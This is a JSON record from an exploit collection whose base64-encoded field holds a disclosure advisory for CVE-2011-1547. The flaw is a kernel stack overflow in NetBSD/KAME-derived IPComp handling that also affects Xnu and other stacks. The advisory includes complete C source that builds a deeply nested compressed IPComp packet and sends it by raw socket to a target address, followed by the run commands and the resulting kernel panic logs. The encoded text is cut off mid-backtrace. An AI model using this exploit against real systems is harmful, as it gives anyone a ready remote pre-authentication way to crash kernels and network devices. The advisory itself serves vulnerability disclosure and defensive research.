{
    "source": "exploit-database", 
    "exploit": "Ly8gc291cmNlOiBodHRwOi8vbGlzdHMuZ3Jvay5vcmcudWsvcGlwZXJtYWlsL2Z1bGwtZGlzY2xvc3VyZS8yMDExLUFwcmlsLzA4MDAzMS5odG1sDQoNCkJTRCBkZXJpdmVkIFJGQzMxNzMgSVBDb21wIGVuY2Fwc3VsYXRpb24gd2lsbCBleHBhbmQgYXJiaXRyYXJpbHkgbmVzdGVkIHBheWxvYWQNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCg0KR3J1ZXppLCB0aGlzIGRvY3VtZW50IGRlc2NyaWJlcyBDVkUtMjAxMS0xNTQ3Lg0KDQpSRkMzMTczIGlwIHBheWxvYWQgY29tcHJlc3Npb24sIGhlbmNlZm9ydGggaXBjb21wLCBpcyBhIHByb3RvY29sIGludGVuZGVkIHRvDQpwcm92aWRlIGNvbXByZXNzaW9uIG9mIGlwIGRhdGFncmFtcywgYW5kIGlzIGNvbW1vbmx5IHVzZWQgYWxvbmdzaWRlIElQU2VjDQooYWx0aG91Z2ggdGhlcmUgaXMgbm8gcmVxdWlyZW1lbnQgdG8gZG8gc28pLg0KDQpBbiBpcGNvbXAgZGF0YWdyYW0gY29uc2lzdHMgb2YgYW4gaXAgaGVhZGVyIHdpdGggaXAtPmlwX3Agc2V0IHRvIDEwOCwgZm9sbG93ZWQNCmJ5IGEgMzIgYml0IGlwY29tcCBoZWFkZXIsIGRlc2NyaWJlZCBpbiBDIHN5bnRheCBiZWxvdy4NCg0Kc3RydWN0IGlwY29tcCB7DQogICAgdWludDhfdCAgICAgY29tcF9ueHQ7ICAgICAgIC8vIE5leHQgSGVhZGVyDQogICAgdWludDhfdCAgICAgY29tcF9mbGFnczsgICAgIC8vIFJlc2VydmVkDQogICAgdWludDE2X3QgICAgY29tcF9jcGk7ICAgICAgIC8vIENvbXByZXNzaW9uIFBhcmFtZXRlciBJbmRleA0KfTsNCg0KVGhlIENvbXByZXNzaW9uIFBhcmFtZXRlciBJbmRleCBpbmRpY2F0ZXMgd2hpY2ggY29tcHJlc3Npb24gYWxnb3JpdGhtIHdhcyB1c2VkDQp0byBjb21wcmVzcyB0aGUgaXBjb21wIHBheWxvYWQsIHdoaWNoIGlzIGV4cGFuZGVkIGFuZCB0aGVuIHJvdXRlZCBhcyByZXF1ZXN0ZWQuDQpBbHRob3VnaCB0aGUgQ1BJIGZpZWxkIGlzIDE2IGJpdHMgd2lkZSwgaW4gcmVhbGl0eSBvbmx5IDEgYWxnb3JpdGhtIGlzIHdpZGVseQ0KaW1wbGVtZW50ZWQsIFJGQzE5NTEgREVGTEFURSAoY3BpPTIpLg0KDQpJdCdzIHdlbGwgZG9jdW1lbnRlZCB0aGF0IGlwY29tcCBjYW4gYmUgdXNlZCB0byB0cmF2ZXJzZSBwZXJpbWV0ZXIgZmlsdGVyaW5nLA0KaG93ZXZlciB0aGlzIGRvY3VtZW50IGRpc2N1c3NlcyBwb3RlbnRpYWwgaW1wbGVtZW50YXRpb24gZmxhd3Mgb2JzZXJ2ZWQgaW4NCnBvcHVsYXIgc3RhY2tzLg0KDQpUaGUgSVBDb21wIGltcGxlbWVudGF0aW9uIG9yaWdpbmF0aW5nIGZyb20gTmV0QlNEL0tBTUUgaW1wbGVtZW50cyBpbmplY3Rpb24gb2YNCnVucGFja2VkIHBheWxvYWRzIGxpa2Ugc286DQoNCiAgICBhbGdvID0gaXBjb21wX2FsZ29yaXRobV9sb29rdXAoY3BpKTsNCg0KICAgIC8qIC4uLiAqLw0KDQogICAgZXJyb3IgPSAoKmFsZ28tPmRlY29tcHJlc3MpKG0sIG0tPm1fbmV4dCwgJm5ld2xlbik7DQoNCiAgICAvKiAuLi4gKi8NCg0KICAgIGlmIChueHQgIT0gSVBQUk9UT19ET05FKSB7DQogICAgICAgIGlmICgoaW5ldHN3W2lwX3Byb3RveFtueHRdXS5wcl9mbGFncyAmIFBSX0xBU1RIRFIpICE9IDAgJiYNCiAgICAgICAgICAgIGlwc2VjNF9pbl9yZWplY3QobSwgTlVMTCkpIHsNCiAgICAgICAgICAgIElQU0VDX1NUQVRJTkMoSVBTRUNfU1RBVF9JTl9QT0xWSU8pOw0KICAgICAgICAgICAgZ290byBmYWlsOw0KICAgICAgICB9DQogICAgICAgICgqaW5ldHN3W2lwX3Byb3RveFtueHRdXS5wcl9pbnB1dCkobSwgb2ZmLCBueHQpOw0KICAgIH0gZWxzZQ0KICAgICAgICBtX2ZyZWVtKG0pOw0KDQogICAgLyogLi4uICovDQoNCldoZXJlIGluZXRzd1tdIGNvbnRhaW5zIGRlZmluaXRpb25zIGZvciBzdXBwb3J0ZWQgcHJvdG9jb2xzLCBhbmQgbnh0IGlzIGENCnByb3RvY29sIG51bWJlciwgdXN1YWxseSBhc3NvY2lhdGVkIHdpdGggaXAtPmlwX3AgKHNlZQ0KaHR0cDovL3d3dy5pYW5hLm9yZy9hc3NpZ25tZW50cy9wcm90b2NvbC1udW1iZXJzL3Byb3RvY29sLW51bWJlcnMueG1sKSwgYnV0IGluDQp0aGlzIGNhc2UgZnJvbSBpcGNvbXAtPmNvbXBfbnh0LiBtIGlzIHRoZSBtYnVmIHN0cnVjdHVyZSBhZGp1c3RlZCB0byBwb2ludCB0bw0KdGhlIHVucGFja2VkIHBheWxvYWQuDQoNClRoZSB1bnBhY2tlZCBwYWNrZXQgaXMgZGlzcGF0Y2hlZCB0byB0aGUgYXBwcm9wcmlhdGUgcHJvdG9jb2wgaGFuZGxlcg0KZGlyZWN0bHkgZnJvbSB0aGUgaXBjb21wIHByb3RvY29sIGhhbmRsZXIuIFRoaXMgcmVjdXJzaXZlIGltcGxlbWVudGF0aW9uIGZhaWxzDQp0byBjaGVjayBmb3Igc3RhY2sgb3ZlcmZsb3csIGFuZCBpcyB0aGVyZWZvcmUgdnVsbmVyYWJsZSB0byBhIHJlbW90ZQ0KcHJlLWF1dGhlbnRpY2F0aW9uIGtlcm5lbCBtZW1vcnkgY29ycnVwdGlvbiB2dWxuZXJhYmlsaXR5Lg0KDQpUaGUgTmV0QlNEL0tBTUUgbmV0d29yayBzdGFjayBpcyB1c2VkIGFzIGJhc2lzIGZvciB2YXJpb3VzIG90aGVyDQpvcGVyYXRpbmcgc3lzdGVtcywgc3VjaCBhcyBYbnUsIEZUT1MsIHZhcmlvdXMgZW1iZWRkZWQgZGV2aWNlcyBhbmQNCm5ldHdvcmsgYXBwbGlhbmNlcywgYW5kIGVhcmxpZXIgdmVyc2lvbnMgb2YgRnJlZUJTRC9PcGVuQlNEICh0aGUgY29kZQ0KaGFzIHNpbmNlIGJlZW4gcmVmYWN0b3JlZCwgYnV0IHNlZSB0aGUgTk9URVMgc2VjdGlvbiByZWdhcmRpbmcgSVBDb21wDQpxdWluZXMsIHdoaWNoIHN0aWxsIHBlcm1pdCByZW1vdGUsIHByZS1hdXRoZW50aWNhdGlvbiwgc2luZ2xlLXBhY2tldCwNCnNwb29mZWQtc291cmNlIERvUyBpbiB0aGUgbGF0ZXN0IHZlcnNpb25zKS4NCg0KVGhlIFhudSBwb3J0IG9mIHRoaXMgY29kZSBpcyBjbG9zZSB0byB0aGUgb3JpZ2luYWwsIHdoZXJlIHRoZSBkZWNvbXByZXNzZWQNCnBheWxvYWQgaXMgcmVjdXJzaXZlbHkgaW5qZWN0ZWQgYmFjayBpbnRvIHRoZSB0b3BsZXZlbCBpcCBkaXNwYXRjaGVyLiBUaGUNCmltcGxlbWVudGF0aW9uIGlzIG90aGVyd2lzZSBzaW1pbGFyLCBhbmQgc29tZSBhbHRlcmF0aW9ucyB0byB0aGUgdGVzdGNhc2UNCnByb3ZpZGVkIGZvciBOZXRCU0Qgc2hvdWxkIG1ha2UgaXQgd29yay4gVGhpcyBpcyBsZWZ0IGFzIGFuIGV4ZXJjaXNlIGZvciB0aGUNCmludGVyZXN0ZWQgcmVhZGVyLg0KDQotLS0tLS0tLS0tLS0tLS0tLS0tLQ0KQWZmZWN0ZWQgU29mdHdhcmUNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQpBbnkgTmV0QlNEIGRlcml2ZWQgSVBDb21wL0lQU2VjIHN0YWNrIG1heSBiZSB2dWxuZXJhYmxlIChYbnUsIEZUT1MsIGV0Yy4pLg0KDQpOZXRCU0QgaXMgbm90IGRpc3RyaWJ1dGVkIHdpdGggSVBTZWMgc3VwcG9ydCBlbmFibGVkIGJ5IGRlZmF1bHQsIGhvd2V2ZXIgQXBwbGUNCk9TWCBhbmQgdmFyaW91cyBvdGhlciBkZXJpdmF0aXZlcyBhcmUuIFRoZXJlIGFyZSBzbyBtYW55IE5ldEJTRCBkZXJpdmVkIG5ldHdvcmsNCnN0YWNrcyB0aGF0IGl0IGlzIGluZmVhc2libGUgdG8gY2hlY2sgdGhlbSBhbGwsIGNvbmNlcm5lZCBhZG1pbmlzdHJhdG9ycyBhcmUNCmFkdmlzZWQgdG8gY2hlY2sgd2l0aCB0aGVpciB2ZW5kb3IgaWYgdGhlcmUgaXMgYW55IGRvdWJ0Lg0KDQpNYWpvciB2ZW5kb3JzIGtub3duIHRvIHVzZSBuZXR3b3JrIHN0YWNrcyBkZXJpdmVkIGZyb20gTmV0QlNEIHdlcmUgcHJlLW5vdGlmaWVkDQphYm91dCB0aGlzIHZ1bG5lcmFiaWxpdHkuIElmIEkgbWlzc2VkIHlvdSwgaXQgaXMgZWl0aGVyIG5vdCB3ZWxsIGtub3duIHRoYXQgeW91DQp1c2UgdGhlIEJTRCBzdGFjaywgeW91IGRpZCBub3QgcmVzcG9uZCB0byBzZWN1cml0eUAgbWFpbCwgb3IgY291bGQgbm90IHVzZSBwZ3ANCnByb3Blcmx5Lg0KDQpBZGRpdGlvbmFsbHksIGFkbWluaXN0cmF0b3JzIG9mIGNyaXRpY2FsIG9yIG1ham9yIGRlcGxveW1lbnRzIG9mIE5ldEJTRCAoZS5nLg0KZG5zIHJvb3Qgc2VydmVycykgd2VyZSBnaXZlbiBhZHZhbmNlIG5vdGljZSBpbiBvcmRlciB0byBkZXBsb3kgYXBwcm9wcmlhdGUNCmZpbHRlciBydWxlcy4NCg0KRXhwbG9pdGFiaWxpdHkgb2Yga2VybmVsIHN0YWNrIG92ZXJmbG93cyB3aWxsIHZhcnkgYnkgcGxhdGZvcm0gKG4uYi4gYSBzdGFjaw0Kb3ZlcmZsb3cgaXMgbm90IGEgc3RhY2sgYnVmZmVyIG92ZXJmbG93LCBmb3IgYSBjb25jaXNlIGRlZmluaXRpb24gc2VlDQpUQU9DUDMsVjEsUzIuMi4yKS4gQWxzbyBub3RlIHRoYXQgYSBrZXJuZWwgc3RhY2sgb3ZlcmZsb3cgaXMgdmVyeSBkaWZmZXJlbnQNCmZyb20gYSB1c2VybGFuZCBzdGFjayBvdmVyZmxvdy4NCg0KRm9yIGZ1cnRoZXIgZGlzY3Vzc2lvbiwgaW5jbHVkaW5nIGF0dGFja3Mgb24gb3RoZXIgb3BlcmF0aW5nIHN5c3RlbXMsDQpzZWUgdGhlIG5vdGVzIHNlY3Rpb24gb24gaXBjb21wIHF1aW5lcyBiZWxvdy4NCg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0NCkNvbnNlcXVlbmNlcw0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCg0KV2hpbGUgZXhwbG9pdGF0aW9uIG9mIGtlcm5lbCBzdGFjayBvdmVyZmxvd3MgaXMgYSBzb21ld2hhdCB1bmRlciByZXNlYXJjaGVkDQp0b3BpYywgdGhlIGF1dGhvciBmZWVscyBhIHNraWxsZWQgYXR0YWNrZXIgd291bGQgYmUgYWJsZSB0byBsZXZlcmFnZSB0aGlzIGZvcg0KcmVtb3RlIGNvZGUgZXhlY3V0aW9uLiBIb3dldmVyLCB0aGlzIGlzIG5vdCBhIHRyaXZpYWwgdGFzaywgYW5kIGlzIGhpZ2hseQ0KcGxhdGZvcm0gZGVwZW5kZW50Lg0KDQpJIGhhdmUgdmVyaWZpZWQga2VybmVsIHN0YWNrIG92ZXJmbG93cyBvbiBOZXRCU0QgYXJlIGV4cGxvaXRhYmxlLCBJIGhhdmUgbG9va2VkDQphdCB0aGUgc291cmNlIGNvZGUgZm9yIHhudSBhbmQgZG8gbm90IHNlZSBhbnkgb2J2aW91cyBvYnN0YWNsZXMgdG8gcHJldmVudA0KZXhwbG9pdGF0aW9uIChrZXJuZWwgc3RhY2sgc2VnbWVudCBsaW1pdHMsIGd1YXJkIHBhZ2VzLCBldGMuIHdoaWNoIHdvdWxkIGNhdXNlDQp0aGUgd29yc3QgaW1wYWN0IHRvIGJlIGxpbWl0ZWQgdG8gcmVtb3RlIGRlbmlhbCBvZiBzZXJ2aWNlKSwgc28gaGF2ZSBubyByZWFzb24NCnRvIGJlbGlldmUgaXQgaXMgZGlmZmVyZW50Lg0KDQpUaG91Z2h0cyBvbiB0aGlzIHRvcGljIGZyb20gZmVsbG93IHJlc2VhcmNoZXJzIHdvdWxkIGJlIHdlbGNvbWUuDQoNClNvdXJjZSBjb2RlIGZvciBhIHNhbXBsZSBMaW51eCBwcm9ncmFtIHRvIHJlcHJvZHVjZSB0aGlzIGZsYXcgb24gTmV0QlNEIGlzDQpsaXN0ZWQgYmVsb3cuIFBsZWFzZSBub3RlLCBjaGVjayBpZiB5b3VyIHN5c3RlbSByZXF1aXJlcyBhbiBJUHY0IGhlYWRlciBpbiB0aGUNCmNvbXByZXNzZWQgcGF5bG9hZCBiZWZvcmUgYXR0ZW1wdGluZyB0byBhZGFwdCBpdCB0byB5b3VyIG5lZWRzLg0KDQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxuZXRpbmV0L2lwLmg+DQojaW5jbHVkZSA8YXJwYS9pbmV0Lmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8c3RkaW8uaD4NCiNpbmNsdWRlIDx6bGliLmg+DQojaW5jbHVkZSA8YWxsb2NhLmg+DQojaW5jbHVkZSA8c3RkYm9vbC5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHN0cmluZy5oPg0KDQovLw0KLy8gQlNEIElQQ29tcCBLZXJuZWwgU3RhY2sgT3ZlcmZsb3cgVGVzdGNhc2UNCi8vICAtLSBUYXZpcyBPcm1hbmR5IDx0YXZpc28gYXQgY21weGNoZzhiLmNvbT4sIE1hcmNoIDIwMTENCi8vDQoNCiNkZWZpbmUgTUFYX1BBQ0tFVF9TSVpFICgxMDI0ICogMTAyNCAqIDMyKQ0KI2RlZmluZSBNQVhfRU5DQVBfREVQVEggMTAyNA0KDQplbnVtIHsNCiAgICBJUENPTVBfT1VJICAgICAgICAgID0gMSwNCiAgICBJUENPTVBfREVGTEFURSAgICAgID0gMiwNCiAgICBJUENPTVBfTFpTICAgICAgICAgID0gMywNCiAgICBJUENPTVBfTUFYLA0KfTsNCg0Kc3RydWN0IGlwY29tcCB7DQogICAgdWludDhfdCAgICAgY29tcF9ueHQ7ICAgICAgIC8vIE5leHQgSGVhZGVyDQogICAgdWludDhfdCAgICAgY29tcF9mbGFnczsgICAgIC8vIFJlc2VydmVkLCBtdXN0IGJlIHplcm8NCiAgICB1aW50MTZfdCAgICBjb21wX2NwaTsgICAgICAgLy8gQ29tcHJlc3Npb24gcGFyYW1ldGVyIGluZGV4DQogICAgdWludDhfdCAgICAgY29tcF9kYXRhWzBdOyAgIC8vIFBheWxvYWQuDQp9Ow0KDQpib29sIGlwY29tcF9lbmNhcHN1bGF0ZV9kYXRhKHZvaWQgICAgICAgICAgICpkYXRhLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzaXplX3QgICAgICAgICAgc2l6ZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50ICAgICAgICAgICAgIG54dCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RydWN0IGlwY29tcCAqKm91dCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2l6ZV90ICAgICAgICAgKmxlbmd0aCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50ICAgICAgICAgICAgIGxldmVsKQ0Kew0KICAgIHN0cnVjdCBpcGNvbXAgKmlwY29tcDsNCiAgICB6X3N0cmVhbSAgICAgICB6c3RyZWFtOw0KDQogICAgaXBjb21wICAgICAgICAgICAgICA9IG1hbGxvYyhNQVhfUEFDS0VUX1NJWkUpOw0KICAgICpvdXQgICAgICAgICAgICAgICAgPSBpcGNvbXA7DQogICAgaXBjb21wLT5jb21wX254dCAgICA9IG54dDsNCiAgICBpcGNvbXAtPmNvbXBfY3BpICAgID0gaHRvbnMoSVBDT01QX0RFRkxBVEUpOw0KICAgIGlwY29tcC0+Y29tcF9mbGFncyAgPSAwOw0KDQogICAgLy8gQ29tcHJlc3MgcGFja2V0IHBheWxvYWQuDQogICAgenN0cmVhbS56YWxsb2MgICAgICA9IFpfTlVMTDsNCiAgICB6c3RyZWFtLnpmcmVlICAgICAgID0gWl9OVUxMOw0KICAgIHpzdHJlYW0ub3BhcXVlICAgICAgPSBaX05VTEw7DQoNCiAgICBpZiAoZGVmbGF0ZUluaXQyKCZ6c3RyZWFtLA0KICAgICAgICAgICAgICAgICAgICAgbGV2ZWwsDQogICAgICAgICAgICAgICAgICAgICBaX0RFRkxBVEVELA0KICAgICAgICAgICAgICAgICAgICAgLTEyLA0KICAgICAgICAgICAgICAgICAgICAgTUFYX01FTV9MRVZFTCwNCiAgICAgICAgICAgICAgICAgICAgIFpfREVGQVVMVF9TVFJBVEVHWSkgIT0gWl9PSykgew0KICAgICAgICBmcHJpbnRmKHN0ZGVyciwgImVycm9yOiBmYWlsZWQgdG8gaW5pdGlhbGl6ZSB6bGliIGxpYnJhcnlcbiIpOw0KICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgfQ0KDQogICAgenN0cmVhbS5hdmFpbF9pbiAgICA9IHNpemU7DQogICAgenN0cmVhbS5uZXh0X2luICAgICA9IGRhdGE7DQogICAgenN0cmVhbS5hdmFpbF9vdXQgICA9IE1BWF9QQUNLRVRfU0laRSAtIHNpemVvZihzdHJ1Y3QgaXBjb21wKTsNCiAgICB6c3RyZWFtLm5leHRfb3V0ICAgID0gaXBjb21wLT5jb21wX2RhdGE7DQoNCiAgICBpZiAoZGVmbGF0ZSgmenN0cmVhbSwgWl9GSU5JU0gpICE9IFpfU1RSRUFNX0VORCkgew0KICAgICAgICBmcHJpbnRmKHN0ZGVyciwgImVycm9yOiBkZWZsYXRlKCkgZmFpbGVkIHRvIGNyZWF0ZSBjb21wcmVzc2VkIHBheWxvYWQsICVzXG4iLCB6c3RyZWFtLm1zZyk7DQogICAgICAgIHJldHVybiBmYWxzZTsNCiAgICB9DQoNCiAgICBpZiAoZGVmbGF0ZUVuZCgmenN0cmVhbSkgIT0gWl9PSykgew0KICAgICAgICBmcHJpbnRmKHN0ZGVyciwgImVycm9yOiBkZWZsYXRlRW5kKCkgcmV0dXJuZWQgZmFpbHVyZSwgJXNcbiIsIHpzdHJlYW0ubXNnKTsNCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0NCg0KICAgIC8vIENhbGN1bGF0ZSBzaXplLg0KICAgICpsZW5ndGggICAgPSAoTUFYX1BBQ0tFVF9TSVpFIC0gc2l6ZW9mKHN0cnVjdCBpcGNvbXApKSAtIHpzdHJlYW0uYXZhaWxfb3V0Ow0KICAgIGlwY29tcCAgICAgPSByZWFsbG9jKGlwY29tcCwgKmxlbmd0aCk7DQoNCiAgICBmcmVlKGRhdGEpOw0KDQogICAgcmV0dXJuIHRydWU7DQp9DQoNCmludCBtYWluKGludCBhcmdjLCBjaGFyICoqYXJndikNCnsNCiAgICBpbnQgICAgICAgICAgICAgICAgIHM7DQogICAgc3RydWN0IHNvY2thZGRyX2luICBzaW4gICAgPSB7MH07DQogICAgc3RydWN0IGlwY29tcCAgICAgICppcGNvbXAgPSBtYWxsb2MoMCk7DQogICAgc2l6ZV90ICAgICAgICAgICAgICBsZW5ndGggPSAwOw0KICAgIHVuc2lnbmVkICAgICAgICAgICAgZGVwdGggID0gMDsNCg0KICAgIC8vIE5lc3QgYW4gaXBjb21wIHBhY2tldCBkZWVwbHkgd2l0aG91dCBjb21wcmVzc2lvbiwgdGhpcyBhbGxvd3MgdXMgdG8NCiAgICAvLyBjcmVhdGUgbWF4aW11bSByZWR1bmRhbmN5Lg0KICAgIGZvciAoZGVwdGggPSAwOyBkZXB0aCA8IE1BWF9FTkNBUF9ERVBUSDsgZGVwdGgrKykgew0KICAgICAgICBpZiAoaXBjb21wX2VuY2Fwc3VsYXRlX2RhdGEoaXBjb21wLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGVuZ3RoLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSVBQUk9UT19DT01QLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJmlwY29tcCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICZsZW5ndGgsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBaX05PX0NPTVBSRVNTSU9OKSAhPSB0cnVlKSB7DQogICAgICAgICAgICBmcHJpbnRmKHN0ZGVyciwgImVycm9yOiBmYWlsZWQgdG8gZW5jYXBzdWxhdGUgZGF0YVxuIik7DQogICAgICAgICAgICByZXR1cm4gMTsNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIC8vIENyZWF0ZSBhIGZpbmFsIG91dGVyIHBhY2tldCB3aXRoIGJlc3QgY29tcHJlc3Npb24sIHdoaWNoIHNob3VsZCBub3cNCiAgICAvLyBjb21wcmVzcyB3ZWxsIGR1ZSB0byBaX05PX0NPTVBSRVNTSU9OIHVzZWQgaW4gaW5uZXIgcGF5bG9hZHMuDQogICAgaWYgKGlwY29tcF9lbmNhcHN1bGF0ZV9kYXRhKGlwY29tcCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGVuZ3RoLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBJUFBST1RPX0NPTVAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICZpcGNvbXAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICZsZW5ndGgsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFpfQkVTVF9DT01QUkVTU0lPTikgIT0gdHJ1ZSkgew0KICAgICAgICBmcHJpbnRmKHN0ZGVyciwgImVycm9yOiBmYWlsZWQgdG8gZW5jYXBzdWxhdGUgZGF0YVxuIik7DQogICAgICAgIHJldHVybiAxOw0KICAgIH0NCg0KICAgIGZwcmludGYoc3Rkb3V0LCAiaW5mbzogY3JlYXRlZCAldSBuZXN0ZWQgaXBjb21wIHBheWxvYWQsICV1IGJ5dGVzXG4iLCBkZXB0aCwgbGVuZ3RoKTsNCg0KICAgIHNpbi5zaW5fZmFtaWx5ICAgICAgPSBBRl9JTkVUOw0KICAgIHNpbi5zaW5fcG9ydCAgICAgICAgPSBodG9ucygwKTsNCiAgICBzaW4uc2luX2FkZHIuc19hZGRyID0gaW5ldF9hZGRyKGFyZ3ZbMV0pOw0KDQogICAgaWYgKChzID0gc29ja2V0KFBGX0lORVQsIFNPQ0tfUkFXLCBJUFBST1RPX0NPTVApKSA8IDApIHsNCiAgICAgICAgZnByaW50ZihzdGRlcnIsICJlcnJvcjogZmFpbGVkIHRvIGNyZWF0ZSBzb2NrZXQsICVtXG4iKTsNCiAgICAgICAgcmV0dXJuIDE7DQogICAgfQ0KDQogICAgaWYgKHNlbmR0byhzLA0KICAgICAgICAgICAgICAgaXBjb21wLA0KICAgICAgICAgICAgICAgbGVuZ3RoLA0KICAgICAgICAgICAgICAgTVNHX05PU0lHTkFMLA0KICAgICAgICAgICAgICAgKGNvbnN0IHN0cnVjdCBzb2NrYWRkciAqKSgmc2luKSwNCiAgICAgICAgICAgICAgIHNpemVvZihzaW4pKSAhPSBsZW5ndGgpIHsNCiAgICAgICAgZnByaW50ZihzdGRlcnIsICJlcnJvcjogc2VuZCgpIHJldHVybmVkIGZhaWx1cmUsICVtXG4iKTsNCiAgICAgICAgcmV0dXJuIDE7DQogICAgfQ0KDQogICAgZnByaW50ZihzdGRvdXQsICJpbmZvOiBzdWNjZXNzLCBwYWNrZXQgc2VudCB0byAlc1xuIiwgYXJndlsxXSk7DQoNCiAgICBmcmVlKGlwY29tcCk7DQoNCiAgICByZXR1cm4gMDsNCn0NCg0KDQpQYWNrZXRzIG9mIHRoZSBmb2xsb3dpbmcgZm9ybSBhcmUgZ2VuZXJhdGVkLg0KDQpJbnRlcm5ldCBQcm90b2NvbCwgU3JjOiAxOTIuMTY4LjEuMSwgRHN0OiAxOTIuMTY4LjEuMg0KICAgIFZlcnNpb246IDQNCiAgICBIZWFkZXIgbGVuZ3RoOiAyMCBieXRlcw0KICAgIERpZmZlcmVudGlhdGVkIFNlcnZpY2VzIEZpZWxkOiAweDA0IChEU0NQIDB4MDE6IFVua25vd24gRFNDUDsgRUNOOiAweDAwKQ0KICAgICAgICAwMDAwIDAxLi4gPSBEaWZmZXJlbnRpYXRlZCBTZXJ2aWNlcyBDb2RlcG9pbnQ6IFVua25vd24gKDB4MDEpDQogICAgICAgIC4uLi4gLi4wLiA9IEVDTi1DYXBhYmxlIFRyYW5zcG9ydCAoRUNUKTogMA0KICAgICAgICAuLi4uIC4uLjAgPSBFQ04tQ0U6IDANCiAgICBUb3RhbCBMZW5ndGg6IDIwNQ0KICAgIElkZW50aWZpY2F0aW9uOiAweGM3MzMgKDUwOTk1KQ0KICAgIEZsYWdzOiAweDAwDQogICAgICAgIDAuLiA9IFJlc2VydmVkIGJpdDogTm90IFNldA0KICAgICAgICAuMC4gPSBEb24ndCBmcmFnbWVudDogTm90IFNldA0KICAgICAgICAuLjAgPSBNb3JlIGZyYWdtZW50czogTm90IFNldA0KICAgIEZyYWdtZW50IG9mZnNldDogMA0KICAgIFRpbWUgdG8gbGl2ZTogNjQNCiAgICBQcm90b2NvbDogSVBDb21wICgweDZjKQ0KICAgIEhlYWRlciBjaGVja3N1bTogMHgyZTY5IFtjb3JyZWN0XQ0KICAgICAgICBbR29vZDogVHJ1ZV0NCiAgICAgICAgW0JhZCA6IEZhbHNlXQ0KICAgIFNvdXJjZTogMTkyLjE2OC4xLjENCiAgICBEZXN0aW5hdGlvbjogMTkyLjE2OC4xLjINCklQIFBheWxvYWQgQ29tcHJlc3Npb24NCiAgICBOZXh0IEhlYWRlcjogSVBDb21wICgweDZjKQ0KICAgIElQQ29tcCBGbGFnczogMHgwMA0KICAgIElQQ29tcCBDUEk6IERFRkxBVEUgKDB4MDAwMikNCiAgICBEYXRhICgxODEgYnl0ZXMpDQogICAgICAgIERhdGE6IDczNjU2MTU4Li4uDQogICAgICAgIFtMZW5ndGg6IDE4MV0NCg0KJCBnY2MgaXBjb21wLmMgLWx6IC1vIGlwY29tcA0KJCBzdWRvIC4vaXBjb21wIDE5Mi4xNjguMS4yDQppbmZvOiBjcmVhdGVkIDEwMjQgbmVzdGVkIGlwY29tcCBwYXlsb2FkLCAyNTM4IGJ5dGVzDQppbmZvOiBzdWNjZXNzLCBwYWNrZXQgc2VudCB0byAxOTIuMTY4LjEuMg0KDQpNYXIgMjUgMDU6MzQ6NDAgIC9uZXRic2Q6IHV2bV9mYXVsdCgweGNhN2JjNzc0LCAweDEwMDAsIDEpIC0+IDB4ZQ0KTWFyIDI1IDA1OjM0OjQwICAvbmV0YnNkOiBmYXRhbCBwYWdlIGZhdWx0IGluIHN1cGVydmlzb3IgbW9kZQ0KTWFyIDI1IDA1OjM0OjQwICAvbmV0YnNkOiB0cmFwIHR5cGUgNiBjb2RlIDAgZWlwIGMwNjMzMjY5IGNzIDggZWZsYWdzIDEwMjAyIGNyMiAxMzM1IGlsZXZlbCAwDQpNYXIgMjUgMDU6MzQ6NDAgIC9uZXRic2Q6IHBhbmljOiB0cmFwDQpNYXIgMjUgMDU6MzQ6NDAgIC9uZXRic2Q6IEJlZ2luIHRyYWNlYmFjay4uLg0KTWFyIDI1IDA1OjM0OjQwICAvbmV0YnNkOiB1dm1fZmF1bHQoMHhjYTdiYzc3NCwgMCwgMSkgLT4gMHhlDQpNYXIgMjUgMDU6MzQ6NDAgIC9uZXRic2Q6IGZhdGFsIHBhZ2UgZmF1bHQgaW4gc3VwZXJ2aXNvciBtb2RlDQpNYXIgMjUgMDU6MzQ6NDAgIC9uZXRic2Q6IHRyYXAgdHlwZSA2IGNvZGUgMCBlaXAgYzA2ZTZjOTAgY3MgOCBlZmxhZ3MgMTAyNDYgY3IyIDggaWxldmVsIDANCk1hciAyNSAwNTozNDo0MCAgL25ldGJzZDogcGFuaWM6IHRyYXANCk1hciAyNSAwNTozNDo0MCAgL25ldGJzZDogRmF1bHRlZCBpbiBtaWQtdHJhY2ViYWNrOyBhYm9ydGluZy4uLg0KDQpBZGp1c3QgZGVwdGggYXMgcmVxdWlyZWQuDQoNCihnZGIpIGJ0DQojMCAgaXBjb21wNF9pbnB1dCAobT0weGMxNGUxMzAwKSBhdCAuLi8uLi8uLi8uLi9uZXRpbmV0Ni9pcGNvbXBfaW5wdXQuYzoxMTINCiMxICAweGMwMWVjMzAyIGluIGlwY29tcDRfaW5wdXQgKG09MHhjMTRlMTMwMCkgYXQgLi4vLi4vLi4vLi4vbmV0aW5ldDYvaXBjb21wX2lucHV0LmM6Mj